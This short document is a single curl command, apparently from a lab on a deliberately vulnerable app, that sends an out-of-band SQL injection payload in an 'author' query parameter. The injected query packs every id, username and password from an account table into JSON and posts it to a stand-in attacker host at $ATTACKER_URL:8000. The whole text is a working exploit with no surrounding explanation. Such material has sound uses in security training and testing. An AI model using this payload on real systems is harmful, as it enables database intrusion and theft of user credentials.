curl $URL/sqli/vulnerable/out-of-band/books \
  --header "Content-Type: application/json" \
  --request GET \
  -G --data-urlencode "author=' OR EXISTS (SELECT 1 FROM http_post('http://$ATTACKER_URL:8000/',(SELECT json_agg(json_build_object('id', id, 'username', username, 'password', password)) FROM account)::text, 'application/json') AS response WHERE response.status BETWEEN 200 AND 299); --" \
  -s | jq